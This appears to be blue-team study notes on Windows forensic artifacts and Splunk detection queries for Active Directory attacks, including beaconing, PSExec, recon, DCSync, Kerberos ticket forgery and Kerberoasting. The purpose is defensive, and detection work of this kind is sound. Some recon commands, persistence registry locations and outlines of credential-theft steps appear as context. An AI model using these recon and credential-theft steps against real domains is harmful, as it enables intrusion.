| **Artifact** | **Location / Registry Key** | **Data Stored** |
|---|---|---|
| Prefetch Files | `C:\\Windows\\Prefetch` | Metadata on executed applications |
| Shimcache | `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\...AppCompatCache` | Program paths, timestamps |
| Amcache | `C:\\Windows\\AppCompat\\Programs\\Amcache.hve` | Executable details |
| UserAssist | `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\...UserAssist` | Application names, execution counts |
| RunMRU Lists | `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\...RunMRU` | Recently executed commands |
| Jump Lists | `%AppData%\\Microsoft\\Windows\\Recent` | Recently accessed files |
| Windows Event Logs | `C:\\Windows\\System32\\winevt\\Logs` | Logs of process events, creation, and termination |

**Windows Persistence Artifacts**

Persistence methods enable attackers to retain access to a system. These methods exploit system components like registry keys, scheduled tasks, and services.

**Registry Keys for Persistence**

- **Run/RunOnce**:
  - `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`
  - `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`
- **WinLogon Keys**:
  - `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon`
- **Startup Keys**:
  - `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders`

**Scheduled Tasks (Schtasks)**

Scheduled tasks in `C:\\Windows\\System32\\Tasks` are stored as XML files, detailing task schedules and commands. These files should be reviewed for rogue or suspicious entries.

**Services**

Windows services run processes in the background. Malicious actors may create or alter services to maintain persistence. The registry key for services is: `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services`.

**Web Browser Forensics**

Web browser analysis can reveal browsing habits, user interactions, and potentially harmful actions. Key artifacts include:

- **Browsing History**: Tracks sites visited, timestamps, and frequency.
- **Cookies**: Stores session details, preferences, and authentication data.
- **Cache**: Contains cached web pages and images, showing accessed sites even if history is cleared.
- **Bookmarks**: Indicates frequently accessed pages.
- **Download History**: Lists downloaded files, source URLs, and timestamps.
- **Autofill Data**: Stores data for forms (e.g., names, addresses).
- **Session Data**: Tracks active sessions, tabs, and open windows.
- **Extensions and Add-ons**: List of installed extensions and their configurations.

**SRUM (System Resource Usage Monitor)**

Introduced in Windows 8, SRUM tracks application and resource usage. Located in `C:\\Windows\\System32\\sru\\sru.db`, this SQLite database records application profiles and resource usage, aiding in:

- **Application Profiling**: Shows executed applications and their paths.
- **Resource Consumption**: Logs CPU, network, and memory usage.
- **Timeline Reconstruction**: Builds a timeline of application use and system events.
- **User and System Context**: Ties activities to specific users, helping in identifying threat actors.
- **Malware Detection**: Tracks unusual application or resource patterns, which may indicate malware.
- **Incident Response**: Provides rapid insights into recent activities for quick threat response.

**13. Detecting Windows Attacks with Splunk**

#### **Creating Custom Splunk Applications**

**1. Creating a Custom Splunk Application**

**Step 1: Access Splunk Web**

- Open your web browser and log in to Splunk Web.

**Step 2: Go to Manage Apps**

- Navigate to the **Apps** menu at the top of the page, then select **Manage Apps**.

**Step 3: Create a New App**

1. On the Apps page, click **Create app**.
2. Complete the following fields:
  - **Name**: Enter the app name, e.g., `Active Directory Attack Detection`.
  - **Folder name**: This should be similar to the app name, e.g., `AD_Attack_Detection`. This folder will be created under `$SPLUNK_HOME/etc/apps/`.
  - **Version**: Enter the initial version, e.g., `1.0.0`.
  - **Description**: Add a brief description, e.g., `Application for detecting Active Directory attacks`.
  - **Template**: Choose `barebones` from the dropdown.
3. Click **Save** to create the app. Your new app should now appear under **Apps**.

---

**2. Understanding the Directory Structure**

After creating the app, navigate to `$SPLUNK_HOME/etc/apps/AD_Attack_Detection`. Inside, you’ll find directories, each serving a specific purpose:

- `/bin`: Store custom scripts here.
- `/default`: Store default configuration files, views, dashboards, and navigation.
- `/local`: Store user-modified configurations for views, dashboards, and navigation.
- `/metadata`: Contains permission files.

---

**3. Editing the Navigation File**

1. Open the file `$SPLUNK_HOME/etc/apps/AD_Attack_Detection/default/data/ui/nav/default.xml` in a text editor.
2. The XML structure defines app navigation, with each `<view>` tag representing a view in the app bar. Here’s an example:

```
<nav search_view="search">
  <view name="search" default='true' />
  <view name="analytics_workspace" />
  <view name="datasets" />
  <view name="reports" />
  <view name="alerts" />
  <view name="dashboards" />
</nav>
```

- **search\_view**: Specifies the default view.
- **default='true'**: Sets the default app homepage, e.g., the search view.

---

**4. Creating a Dashboard**

1. Navigate to **Dashboards** in your Splunk app.
2. Click **Create New Dashboard** and provide:
  - **Dashboard Name**: e.g., `AD Attack Dashboard`
  - **Description**: (optional)
  - **Permissions**: Set according to needs.
  - **Dashboard Type**: Choose `Classic Dashboards`.
3. Configure the dashboard with panels, inputs, and time range settings.
4. To reference inputs, use tokens enclosed in `$`, e.g., `$user$`.

**Dashboard Storage**

The XML configuration for each dashboard is stored in `<AppPath>/local/data/ui/views/dashboard_title.xml`.

**Adding Dashboards to Navigation**

1. Open `$SPLUNK_HOME/etc/apps/AD_Attack_Detection/default/data/ui/nav/default.xml`.
2. Add the dashboard title in the `<nav>` section to make it accessible in the app's navigation.

---

**5. Restart Splunk**

- Restart Splunk to apply the changes and see the new dashboard listed in the app’s navigation bar.

---

**6. Grouping Dashboards in the Navigation Bar**

To group multiple dashboards, use the `<collection>` tag in `default.xml`:

```
<collection label="AD Monitoring Dashboards">
  <view name="dashboard1" />
  <view name="dashboard2" />
</collection>
```

---

**7. Updating an Existing App**

To update the app with a pre-configured application file:

1. **Download** the `Detection-of-Active-Directory-Attacks.tar.gz` file from the Resources section.
2. Go to **Apps -> Manage Apps** and click **Install app from file**.
3. Browse for the file, check **Upgrade app** to overwrite the existing app, then click **Upload**.

#### **Detecting Beaconing Malware**

**Overview**

Beaconing malware, like Cobalt Strike in its default configuration, often communicates with its Command and Control (C2) server at predictable intervals. By monitoring and analyzing the intervals between communications, we can identify patterns indicative of beaconing behavior. This guide provides a Splunk query to detect such patterns in HTTP traffic logs generated by Zeek.

---

**Setting Up the Detection Query**

This Splunk query identifies beaconing behavior by analyzing consistent intervals in HTTP traffic. It flags cases where most communication events occur at regular intervals, which may indicate malware beaconing.

**Query Explanation**

1. **Filter for Beaconing Data**:
  - `index="cobaltstrike_beacon"` and `sourcetype="bro:http:json"` specify the relevant data source and sourcetype for Cobalt Strike beaconing data in JSON format from Zeek logs.
2. **Event Time Sorting**:
  - `sort 0 _time` sorts events in ascending order based on their timestamp, ensuring time-based calculations are accurate.
3. **Calculate Time Differences**:
  - `streamstats` computes the time difference (`timedelta`) between consecutive events for each unique source-destination pair and destination port, grouping events by `src`, `dest`, and `dest_port`.
4. **Calculate Average Time Interval**:
  - `eventstats` calculates the average time interval (`avg`) and total count of events (`total`) for each source-destination pair and destination port combination.
5. **Define Acceptable Time Interval Range**:
  - `eval upper=avg*1.1` and `eval lower=avg*0.9` set upper and lower bounds for time intervals (10% margin above and below the average).
6. **Filter for Consistent Intervals**:
  - `where timedelta > lower AND timedelta < upper` filters events that fall within the acceptable time interval range, indicating a consistent beaconing interval.
7. **Calculate Consistency Percentage**:
  - `stats` aggregates the data and calculates the percentage (`prcnt`) of events falling within the defined time interval range for each connection.
8. **Threshold Filtering**:
  - `where prcnt > 90 AND total > 10` includes only results where over 90% of events fall within the beaconing pattern range and there are at least 10 events, making the detection more accurate.

**Splunk Query**

```
index="cobaltstrike_beacon" sourcetype="bro:http:json"
| sort 0 _time
| streamstats current=f last(_time) as prevtime by src, dest, dest_port
| eval timedelta = _time - prevtime
| eventstats avg(timedelta) as avg, count as total by src, dest, dest_port
| eval upper=avg*1.1
| eval lower=avg*0.9
| where timedelta > lower AND timedelta < upper
| stats count, values(avg) as TimeInterval by src, dest, dest_port, total
| eval prcnt = (count/total)*100
| where prcnt > 90 AND total > 10
```

---

**Field Descriptions**

- `index="cobaltstrike_beacon"`: Filters events for the specific Cobalt Strike beaconing index.
- `sourcetype="bro:http:json"`: Specifies the Zeek HTTP logs in JSON format as the source type.
- `sort 0 _time`: Sorts events chronologically.
- `streamstats last(_time) as prevtime by src, dest, dest_port`: Calculates the time of the previous event for each source-destination pair and port.
- `eventstats avg(timedelta) as avg, count as total`: Calculates the average interval and total count for each connection.
- `eval upper=avg*1.1` and `eval lower=avg*0.9`: Sets a margin for the average interval to account for slight variations.
- `where timedelta > lower AND timedelta < upper`: Filters for intervals within the margin, indicating a consistent pattern.
- `stats count, values(avg) as TimeInterval`: Aggregates results by the average interval and connection details.
- `where prcnt > 90 AND total > 10`: Retains connections with high consistency and significant event counts, reducing false positives.

**Interpreting Results**

- **Consistent Intervals**: Connections showing over 90% of events within the defined time interval range suggest beaconing behavior.
- **Event Count Threshold**: Ensuring a minimum of 10 events avoids false positives from low-activity connections.

#### **Detecting Cobalt Strike's PSExec**

**Splunk Query for Detecting Cobalt Strike’s PSExec**

The following query detects the specific behavior patterns associated with Cobalt Strike’s `psexec` tool, which involves opening executable files over SMB in specific paths typically used for administrative tasks.

```
index="cobalt_strike_psexec"
sourcetype="bro:smb_files:json"
action="SMB::FILE_OPEN"
name IN ("*.exe", "*.dll", "*.bat")
path IN ("*\\\\c$", "*\\\\ADMIN$")
size>0
```

**Query Breakdown**

1. **Data Source Selection**:
  - `index="cobalt_strike_psexec"`: Searches within the specified index for logs related to Cobalt Strike `psexec` activity.
  - `sourcetype="bro:smb_files:json"`: Filters events to include only those that match the `bro:smb_files:json` sourcetype, which represents SMB file operation logs captured by Zeek.
2. **Filtering for File Open Actions**:
  - `action="SMB::FILE_OPEN"`: This narrows the search to events where a file was opened over SMB, as `psexec` typically opens an executable file on the target system.
3. **Suspicious File Names**:
  - `name IN ("*.exe", "*.dll", "*.bat")`: Filters events to focus on file types commonly associated with executable code, such as `.exe`, `.dll`, and `.bat` files. These file types are typical payloads that attackers use to deploy malicious services.
4. **Administrative SMB Paths**:
  - `path IN ("*\\\\c$", "*\\\\ADMIN$")`: This filters for SMB activity on administrative shares commonly used for remote administration and file transfers. The paths `C$` and `ADMIN$` are often accessed by `psexec` tools during payload deployment.
5. **File Size Greater Than Zero**:
  - `size>0`: Ensures that the event pertains to files that are not empty, as non-empty files are more likely to be executables or payloads rather than benign artifacts.

**Interpretation and Detection Strategy**

This query is designed to detect a sequence of actions consistent with Cobalt Strike’s `psexec` execution:

- **Service Creation and Payload Delivery**: When `psexec` deploys a payload, it typically opens an executable file (e.g., `.exe`) on the target system over SMB. Filtering by specific paths (`C$` and `ADMIN$`) helps isolate activity on administrative shares, which is indicative of remote administration attempts.
- **Identifying Potential Malicious Activity**: Since legitimate administrative file operations typically do not involve arbitrary `.exe`, `.dll`, or `.bat` files on these paths, this search helps surface potential malicious activity. Additionally, focusing on non-zero file sizes eliminates irrelevant entries, further refining the results to show executable files likely linked to `psexec` operations.

#### **Detecting Common User & Domain Recon**

**Domain Reconnaissance Overview**

**Key Concepts**

- **Active Directory (AD) Domain Reconnaissance**: A critical phase in the attack lifecycle where attackers gather information on the AD environment, seeking knowledge about its:
  - Architecture, network topology, and security setup.
  - Key assets, including Domain Controllers, user accounts, groups, trust relationships, OUs, and GPOs.
- **Objective**: Identify high-value targets, escalate privileges, and enable lateral movement.

**Recon Techniques with Native Windows Commands**

Adversaries may execute commands like `net group` to list Domain Administrators. Common Windows executables used for domain reconnaissance include:

- `whoami /all`
- `wmic computersystem get domain`
- `net user /domain`
- `net group "Domain Admins" /domain`
- `arp -a`
- `nltest /domain_trusts`

**Detection**: Use PowerShell and command-line monitoring to flag unusual command execution.

**Recon with BloodHound/SharpHound**

- **BloodHound**: Open-source tool for visualizing AD relationships, trust paths, permissions, and group memberships.
- **SharpHound**: BloodHound’s C# data collector; commonly run with `c all` to gather comprehensive data.

**BloodHound Detection Methods**

- **LDAP Queries**: BloodHound collectors perform many LDAP queries on Domain Controllers.
- **Monitoring Techniques**:
  - **Event 1644**: Windows LDAP performance monitoring, though limited in visibility.
  - **ETW Provider (Microsoft-Windows-LDAP-Client)**: Used with tools like **SilkETW** and **SilkService** (supports Yara rule-based query detection).
  - **Predefined LDAP Filters**: Use filters recommended by Microsoft’s ATP team to recognize common reconnaissance LDAP queries.

---

**Detecting User/Domain Recon with Splunk**

**Objective**: Use Splunk queries to detect common reconnaissance activities in a specific time frame, filtering high-volume noise to focus on suspicious events.

**Detecting Recon Using Native Windows Executables**

**Timeframe**: `earliest=1690447949` to `latest=1690450687`

**Splunk Query**

```
index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 earliest=1690447949 latest=1690450687
| search process_name IN (arp.exe,chcp.com,ipconfig.exe,net.exe,net1.exe,nltest.exe,ping.exe,systeminfo.exe,whoami.exe)
  OR (process_name IN (cmd.exe,powershell.exe) AND process IN (*arp*,*chcp*,*ipconfig*,*net*,*net1*,*nltest*,*ping*,*systeminfo*,*whoami*))
| stats values(process) as process, min(_time) as _time by parent_process, parent_process_id, dest, user
| where mvcount(process) > 3
```

**Query Breakdown**

1. **Filter by Index and Source**:
  - Logs are pulled from Sysmon’s process creation events (`EventID=1`) within a specific timeframe.
2. **Process Name Filter**:
  - Targets processes typically associated with reconnaissance commands or command-line tools.
3. **Aggregate with Stats**:
  - Groups results by `parent_process`, `parent_process_id`, `dest`, and `user`, collecting unique processes and earliest timestamps.
4. **Filter by Process Count**:
  - Flags events where more than three reconnaissance-related processes were run by the same parent process.

---

**Detecting Recon Using BloodHound**

**Timeframe**: `earliest=1690195896` to `latest=1690285475`

**Splunk Query**

```
index=main earliest=1690195896 latest=1690285475 source="WinEventLog:SilkService-Log"
| spath input=Message
| rename XmlEventData.* as *
| table _time, ComputerName, ProcessName, ProcessId, DistinguishedName, SearchFilter
| sort 0 _time
| search SearchFilter="*(samAccountType=805306368)*"
| stats min(_time) as _time, max(_time) as maxTime, count, values(SearchFilter) as SearchFilter by ComputerName, ProcessName, ProcessId
| where count > 10
| convert ctime(maxTime)
```

**Query Breakdown**

1. **Filter by Index and Source**:
  - Searches SilkService logs for events within a specified timeframe.
2. **Extract Fields**:
  - `spath` extracts structured fields (e.g., XML data) from `Message`.
3. **Rename and Table**:
  - Renames fields for easier reference and organizes results by key data points.
4. **Filter by LDAP Search Filter**:
  - Detects queries containing `samAccountType=805306368`, often linked to BloodHound’s AD queries.
5. **Statistics Aggregation**:
  - Counts events by `ComputerName`, `ProcessName`, and `ProcessId`, checking for instances with over 10 occurrences.
6. **Convert Timestamp**:
  - Formats `maxTime` to human-readable format for timeline analysis.

#### **Detecting DCSync & DCShadow**

**DCSync**

DCSync is a technique used by attackers to request domain replication data, effectively imitating a domain controller to extract password hashes from Active Directory Domain Controllers (DCs). This attack allows an attacker to obtain current and historical password hashes, which can then be used for further attacks, such as crafting Golden or Silver Tickets.

**Attack Steps**

1. **Administrative Access**: The attacker gains administrative access to a domain-joined system or escalates privileges.
2. **Request Replication Data**: Using tools like Mimikatz, the attacker uses the `DRSGetNCChanges` interface to request domain replication data.
3. **Use of Extracted Hashes**: The attacker uses the acquired data to create Golden or Silver Tickets or conduct Pass-the-Hash attacks.

**Detection Opportunities**

- **Event ID 4662**: This event logs DS-Replication-Get-Changes operations, necessary for detecting DCSync activities.
- **Audit Policy Configuration**: Ensure Advanced Audit Policy is configured for Directory Service Access (not enabled by default).

---

**Example Splunk Query: Detecting DCSync with Event ID 4662**

**Description**: This search identifies Directory Service replication requests associated with DCSync by looking for the “Replicating Directory Changes” property in Event ID 4662.

**Timeframe**: `earliest=1690544278 latest=1690544280`

```
index=main earliest=1690544278 latest=1690544280 EventCode=4662 Message="*Replicating Directory Changes*"
| rex field=Message "(?P<property>Replicating Directory Changes.*)"
| table _time, user, object_file_name, Object_Server, property
```

---

**DCShadow**

DCShadow is an advanced attack that enables attackers to create unauthorized Active Directory changes without triggering standard logs. This tactic involves creating rogue domain controllers, which can modify AD objects and spread unauthorized changes across the domain.

**Attack Steps**

1. **Administrative Access**: The attacker gains high privileges to register a rogue domain controller.
2. **Register Rogue DC**: The attacker registers a rogue DC and makes AD changes, such as adding users to the Domain Admins group.
3. **Replicate Changes**: The rogue DC replicates changes with legitimate DCs, spreading unauthorized modifications.

**Detection Opportunities**

- **Event ID 4742**: This event captures changes to computer objects, including ServicePrincipalName (SPN) modifications.
- **New**`nTDSDSA`**Object**: Detect the addition of `nTDSDSA` objects in AD schema, typically associated with DCShadow.

---

**Example Splunk Query: Detecting DCShadow with Event ID 4742**

**Description**: This query identifies changes to computer accounts associated with DCShadow by looking for modifications in the `ServicePrincipalName`.

**Timeframe**: `earliest=1690623888 latest=1690623890`

```
index=main earliest=1690623888 latest=1690623890 EventCode=4742
| rex field=Message "(?P<gcspn>XX\\/[a-zA-Z0-9\\.\\-\\/]+)"
| table _time, ComputerName, Security_ID, Account_Name, user, gcspn
| search gcspn=*
```

---

**Summary**

DCSync and DCShadow are powerful techniques for attackers targeting Active Directory environments. By monitoring for specific event IDs and unusual changes in replication and computer object properties, security teams can enhance detection capabilities and mitigate the risks associated with these attacks.

#### **Detecting Exfiltration (DNS)**

**Splunk Query for Detecting DNS Exfiltration**

```
index=dns_exf sourcetype="bro:dns:json"
| eval len_query=len(query)
| search len_query>=40 AND query!="*.ip6.arpa*" AND query!="*amazonaws.com*" AND query!="*._googlecast.*" AND query!="_ldap.*"
| bin _time span=24h
| stats count(query) as req_by_day by _time, id.orig_h, id.resp_h
| where req_by_day>60
| table _time, id.orig_h, id.resp_h, req_by_day
```

**Query Breakdown**

1. **Selecting Relevant Data**:
  - `index=dns_exf sourcetype="bro:dns:json"`: Filters data to focus on DNS logs (in `bro:dns:json` format) in the `dns_exf` index, where suspected DNS exfiltration activities are logged.
2. **Calculating Query Length**:
  - `| eval len_query=len(query)`: Calculates the length of each DNS query string, storing it in a new field called `len_query`. This length is used to detect unusually long DNS queries, which may indicate data embedded within the DNS request.
3. **Filtering by Query Length and Excluding Common Domains**:
  - `| search len_query>=40 AND query!="*.ip6.arpa*" AND query!="*amazonaws.com*" AND query!="*._googlecast.*" AND query!="_ldap.*"`:
    - Filters out DNS queries shorter than 40 characters and excludes common, benign domains and reverse lookups (e.g., `ip6.arpa`, `amazonaws.com`, `googlecast`, and `_ldap`).
    - Queries longer than 40 characters are often a sign of encoded or encrypted data embedded within the DNS requests.
4. **Grouping Data by 24-Hour Intervals**:
  - `| bin _time span=24h`: Groups the events into 24-hour time intervals, allowing for daily analysis of query volume.
5. **Counting Queries by Day and Identifying High-Volume Sources**:
  - `| stats count(query) as req_by_day by _time, id.orig_h, id.resp_h`: Aggregates the total number of DNS requests per day (`req_by_day`) by source IP (`id.orig_h`) and destination IP (`id.resp_h`) in each 24-hour interval.
6. **Flagging Unusual Activity**:
  - `| where req_by_day>60`: Filters results to show only cases where the daily query count exceeds 60, as high-frequency queries can indicate DNS-based data exfiltration.
7. **Output Table**:
  - `| table _time, id.orig_h, id.resp_h, req_by_day`: Displays the timestamp (`_time`), source IP (`id.orig_h`), destination IP (`id.resp_h`), and daily request count (`req_by_day`) in a table format for easy analysis.

#### **Detecting Exfiltration (HTTP)**

**Splunk Query for Detecting HTTP Exfiltration**

```
index="cobaltstrike_exfiltration_http" sourcetype="bro:http:json" method=POST
| stats sum(request_body_len) as TotalBytes by src, dest, dest_port
| eval TotalBytes = TotalBytes/1024/1024
```

**Query Breakdown**

1. **Data Source Selection**:
  - `index="cobaltstrike_exfiltration_http"`: Filters logs within the `cobaltstrike_exfiltration_http` index, which captures suspected exfiltration activity.
  - `sourcetype="bro:http:json"`: Focuses on Zeek HTTP logs formatted in JSON, which allows us to examine HTTP requests and responses.
  - `method=POST`: Filters only HTTP POST requests since they are commonly used for data exfiltration in the body of the request.
2. **Aggregating Data Volume**:
  - `| stats sum(request_body_len) as TotalBytes by src, dest, dest_port`: Aggregates the total data transferred in the POST body for each source IP (`src`), destination IP (`dest`), and destination port (`dest_port`).
    - `request_body_len` represents the length of the POST request body in bytes, which includes any data potentially exfiltrated.
    - `sum(request_body_len)`: Calculates the total volume of data sent in the POST body to each destination.
3. **Converting Data Size**:
  - `| eval TotalBytes = TotalBytes/1024/1024`: Converts the total data volume from bytes to megabytes (MB) for easier analysis.

#### **Detecting Golden Tickets and Silver Tickets**

**Golden Ticket**

**Golden Ticket** attacks involve forging a Ticket Granting Ticket (TGT) to impersonate a domain administrator and gain full access to the domain. This attack is persistent and difficult to detect as it uses a valid, forged TGT that can be created offline by an attacker.

**Attack Steps**

1. **Extract KRBTGT Hash**: The attacker obtains the NTLM hash of the KRBTGT account, typically using DCSync or by dumping NTDS.dit and LSASS.
2. **Forge TGT**: The attacker creates a TGT using the KRBTGT hash, granting themselves domain administrator privileges.
3. **Inject Forged TGT**: The attacker injects this TGT into a logon session, enabling unauthorized access to domain resources.

**Detection Opportunities**

Detection relies on identifying indicators such as:

- **DCSync activity**: Monitoring for suspicious DCSync requests.
- **NTDS.dit or LSASS access**: Sysmon Event ID 10 can help track LSASS access for hash extraction.
- **Pass-the-Ticket alerts**: Golden Ticket use resembles Pass-the-Ticket behaviors.

---

**Example Splunk Query: Detecting Golden Tickets**

**Description**: This search identifies Golden Ticket use by looking for Kerberos events without an associated Event ID 4768. These unlinked tickets may indicate forgery.

**Timeframe**: `earliest=1690451977 latest=1690452262`

```
index=main earliest=1690451977 latest=1690452262 source="WinEventLog:Security" user!=*$ EventCode IN (4768,4769,4770)
| rex field=user "(?<username>[^@]+)"
| rex field=src_ip "(\\:\\:ffff\\:)?(?<src_ip_4>[0-9\\.]+)"
| transaction username, src_ip_4 maxspan=10h keepevicted=true startswith=(EventCode=4768)
| where closed_txn=0
| search NOT user="*$@*"
| table _time, ComputerName, username, src_ip_4, service_name, category
```

---

**Silver Ticket**

**Silver Ticket** attacks allow adversaries to create forged service-specific TGS tickets for targeted resources, providing limited access compared to Golden Tickets.

**Attack Steps**

1. **Extract Service Account Hash**: The attacker extracts the NTLM hash of a target service account (e.g., SQL Server).
2. **Forge TGS Ticket**: Using the hash, the attacker creates a forged TGS ticket.
3. **Inject and Access**: The attacker injects the forged ticket into a session to gain access to specific resources.

**Detection Opportunities**

Detection focuses on:

- **New User Creation**: Event ID 4720 can identify newly created accounts.
- **Privilege Assignments**: Event ID 4672 helps monitor special logon privileges given to accounts, which may indicate suspicious access.

---

**Example Splunk Queries for Silver Ticket Detection**

**Query 1: Comparing Created Users with Logged-in Users**

**Description**: This search cross-references newly created users against recent logins to detect suspicious account activity.

**User List Creation**:

```
index=main latest=1690448444 EventCode=4720
| stats min(_time) as _time, values(EventCode) as EventCode by user
| outputlookup users.csv
```

**Logged-in Users Comparison**:

**Timeframe**: `latest=1690545656`

```
index=main latest=1690545656 EventCode=4624
| stats min(_time) as firstTime, values(ComputerName) as ComputerName, values(EventCode) as EventCode by user
| eval last24h = 1690451977
| where firstTime > last24h
| convert ctime(firstTime)
| convert ctime(last24h)
| lookup users.csv user as user OUTPUT EventCode as Events
| where isnull(Events)
```

**Query 2: Detecting Special Privileges on New Logon Events**

**Description**: This search identifies accounts with special privileges assigned recently, indicating potentially unauthorized access using Silver Tickets.

**Timeframe**: `latest=1690545656`

```
index=main latest=1690545656 EventCode=4672
| stats min(_time) as firstTime, values(ComputerName) as ComputerName by Account_Name
| eval last24h = 1690451977
| where firstTime > last24h
| table firstTime, ComputerName, Account_Name
| convert ctime(firstTime)
```

---

**Summary**

Golden Ticket and Silver Ticket attacks exploit the Kerberos authentication process to allow unauthorized access within a Windows Active Directory environment. Detection efforts focus on identifying anomalies in user logons, newly created accounts, and assigned privileges. By combining behavioral and event-based detections in Splunk, security teams can improve their ability to identify and respond to these advanced attacks.

#### **Detecting Golden Tickets**

**Splunk Query for Detecting Golden Tickets**

The query below is designed to flag suspicious Kerberos activity, specifically identifying situations where TGS (Ticket Granting Service) tickets are being requested without the usual AS-REQ and AS-REP steps. This pattern suggests that an attacker may have forged a TGT, allowing them to directly request service tickets.

```
index="golden_ticket_attack" sourcetype="bro:kerberos:json"
| where client!="-"
| bin _time span=1m
| stats values(client), values(request_type) as request_types, dc(request_type) as unique_request_types by _time, id.orig_h, id.resp_h
| where request_types=="TGS" AND unique_request_types==1
```

**Query Breakdown**

1. **Data Selection**:
  - `index="golden_ticket_attack" sourcetype="bro:kerberos:json"`: Searches within the specified index for logs in `bro:kerberos:json` format, which represents Kerberos events from Zeek.
2. **Client Filtering**:
  - `| where client!="-“`: Excludes events where the `client` field is blank (`"-"`), which filters out irrelevant events lacking client information and minimizes noise.
3. **Time Binning**:
  - `| bin _time span=1m`: Groups events into one-minute intervals based on `_time`, the event timestamp, to detect patterns of rapid ticket requests within these short windows.
4. **Aggregating Statistics**:
  - `| stats values(client), values(request_type) as request_types, dc(request_type) as unique_request_types by _time, id.orig_h, id.resp_h`: Aggregates data by:
    - `_time`: The timestamp (by minute).
    - `id.orig_h`: Source IP (the client making the request).
    - `id.resp_h`: Destination IP (typically the Domain Controller).
  - **Field Calculations**:
    - `values(client)`: Lists unique clients associated with the events.
    - `values(request_type) as request_types`: Captures all unique Kerberos request types observed within each time interval.
    - `dc(request_type) as unique_request_types`: Counts distinct Kerberos request types to check for diversity in request types (an indicator of normal Kerberos activity).
5. **Filtering for Golden Ticket Behavior**:
  - `| where request_types=="TGS" AND unique_request_types==1`: Isolates cases where:
    - The only request type is `TGS`, indicating direct access to service tickets without preceding AS-REQ/AS-REP steps.
    - `unique_request_types==1`, confirming no other request types are present, reinforcing suspicion of a Golden Ticket or similar attack that skips the typical Kerberos authentication steps.

**Interpretation**

- **What It Flags**:
  - This query will flag any instances where a client makes only `TGS` requests within a minute interval, with no evidence of `AS-REQ` or other Kerberos request types. This behavior is atypical, as legitimate users generally initiate Kerberos authentication with an `AS-REQ` to obtain a TGT.
  - By identifying such patterns, we can highlight possible Golden Ticket attacks where an attacker forges a TGT to bypass initial authentication, directly requesting service tickets instead.
- **What to Investigate**:
  - **Source IP and Client Information**: Look into the client (`id.orig_h`) making the requests to verify whether they’re a known user or a potentially compromised machine.
  - **Repetitive Patterns**: Multiple consecutive intervals with only TGS requests from the same client can reinforce suspicion of malicious intent.
  - **Anomalous Destination IPs**: Destination addresses (`id.resp_h`) that don’t typically interact with the source may indicate an unauthorized service request.

#### **Detecting Kerberoasting & AS-REProasting**

**Overview of Kerberoasting**

**Kerberoasting** is an attack targeting service accounts in Active Directory. Attackers leverage weaknesses in Kerberos ticket encryption to extract and attempt to crack password hashes of service accounts.

**Kerberoasting Attack Steps:**

1. **Identify Service Accounts**: The attacker enumerates AD to find accounts with Service Principal Names (SPNs) set.
2. **Request TGS Tickets**: They request TGS tickets for these accounts, which contain password hashes.
3. **Offline Brute-Force**: The encrypted hashes are then cracked offline using tools like Hashcat or John the Ripper.

**Detection Opportunities for Kerberoasting**

Detecting Kerberoasting involves monitoring for unusual LDAP queries that seek SPNs, followed by detecting TGS requests without corresponding logons. Relevant Windows events include:

- **Event ID 4768**: Kerberos TGT Request
- **Event ID 4769**: Kerberos Service Ticket Request
- **Event ID 4648**: Logon attempts with explicit credentials.

---

**Detecting Kerberoasting With Splunk**

**Example 1: Detecting Benign TGS Requests**

**Timeframe**: `earliest=1690388417 latest=1690388630`

```
index=main earliest=1690388417 latest=1690388630 EventCode=4648 OR (EventCode=4769 AND service_name=iis_svc)
| dedup RecordNumber
| rex field=user "(?<username>[^@]+)"
| table _time, ComputerName, EventCode, name, username, Account_Name, Account_Domain, src_ip, service_name, Ticket_Options, Ticket_Encryption_Type, Target_Server_Name, Additional_Information
```

**Example 2: Detecting Kerberoasting Through SPN Querying**

**Timeframe**: `earliest=1690448444 latest=1690454437`

```
index=main earliest=1690448444 latest=1690454437 source="WinEventLog:SilkService-Log"
| spath input=Message
| rename XmlEventData.* as *
| table _time, ComputerName, ProcessName, DistinguishedName, SearchFilter
| search SearchFilter="*(&(samAccountType=805306368)(servicePrincipalName=*)*"
```

**Example 3: Detecting TGS Requests Without Logon Events**

**Timeframe**: `earliest=1690450374 latest=1690450483`

```
index=main earliest=1690450374 latest=1690450483 EventCode=4648 OR (EventCode=4769 AND service_name=iis_svc)
| dedup RecordNumber
| rex field=user "(?<username>[^@]+)"
| bin span=2m _time
| search username!=*$
| stats values(EventCode) as Events, values(service_name) as service_name, values(Additional_Information) as Additional_Information, values(Target_Server_Name) as Target_Server_Name by _time, username
| where !match(Events,"4648")
```

---

**Detecting AS-REPRoasting**

**AS-REPRoasting** targets accounts with pre-authentication disabled. Attackers can request an AS-REQ ticket, capturing the encrypted TGT without needing to authenticate, which they then attempt to crack.

**Detection Opportunities for AS-REPRoasting**

Key detection opportunities include identifying accounts with **Pre-Authentication disabled** through LDAP monitoring and detecting **TGT requests for accounts without pre-authentication** (Event ID 4768 with `Pre_Authentication_Type=0`).

---

**Detecting AS-REPRoasting With Splunk**

**Example 1: Querying Accounts With Pre-Auth Disabled**

**Timeframe**: `earliest=1690392745 latest=1690393283`

```
index=main earliest=1690392745 latest=1690393283 source="WinEventLog:SilkService-Log"
| spath input=Message
| rename XmlEventData.* as *
| table _time, ComputerName, ProcessName, DistinguishedName, SearchFilter
| search SearchFilter="*(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)*"
```

**Example 2: TGT Requests for Accounts With Pre-Auth Disabled**

**Timeframe**: `earliest=1690392745 latest=1690393283`

```
index=main earliest=1690392745 latest=1690393283 source="WinEventLog:Security" EventCode=4768 Pre_Authentication_Type=0
| rex field=src_ip "(\\:\\:ffff\\:)?(?<src_ip>[0-9\\.]+)"
| table _time, src_ip, user, Pre_Authentication_Type, Ticket_Options, Ticket_Encryption_Type
```

**Explanation of Splunk Search Components**

1. **Filtering by Index and Event Codes**: Limits search to specific indices and event codes, targeting TGT and TGS requests.
